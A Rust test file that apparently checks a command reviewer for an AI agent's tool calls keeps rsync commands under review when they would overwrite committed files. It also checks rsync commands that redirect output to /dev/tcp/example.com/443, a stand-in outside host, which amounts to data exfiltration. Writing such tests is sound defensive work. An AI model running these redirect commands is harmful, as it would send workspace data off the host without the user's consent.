#![cfg(unix)]

//! A local `rsync` copy is only contained into a destination it cannot
//! clobber, and only while nothing it prints can leave the host.

use crate::pretool_git_session_ops::{git, session, Session};

const CONTAINED: &str = "native_workspace_containment_required";

fn assert_stays_reviewed(session: &Session, command: &str) {
    let result = session.evaluate_at(command, &session.primary);
    assert_ne!(result.minimum_action, "allow", "{command}");
    assert_ne!(result.reason_code, CONTAINED, "{command}");
}

#[test]
fn a_copy_into_committed_files_keeps_its_review() {
    let session = session("rsync-overwrite");
    let assets = session.primary.join("assets");
    std::fs::create_dir(&assets).unwrap();
    std::fs::write(assets.join("logo.txt"), "committed\n").unwrap();
    git(&session.home, &session.primary, &["add", "assets"]);
    git(
        &session.home,
        &session.primary,
        &["commit", "--quiet", "-m", "assets"],
    );
    for command in [
        "rsync -a src/ assets/",
        "rsync -a src/ assets",
        "rsync -a src/ lib/ assets/",
        "rsync -a src/ tracked.txt",
        "rsync -a src/ .",
        "mkdir -p assets && rsync -a src/ assets/",
    ] {
        assert_stays_reviewed(&session, command);
    }
}

#[test]
fn a_redirect_beyond_dev_null_keeps_the_review() {
    let session = session("rsync-redirect");
    for command in [
        "rsync -a src/ fresh/ >/dev/tcp/example.com/443",
        "rsync -a src/ fresh/ 2>/dev/tcp/example.com/443",
        "rsync -a src/ fresh/ >& /dev/tcp/example.com/443",
        "rsync -a src/ fresh/>/dev/tcp/example.com/443",
        "rsync -a src/ fresh/>log>/dev/tcp/example.com/443",
    ] {
        assert_stays_reviewed(&session, command);
    }
}
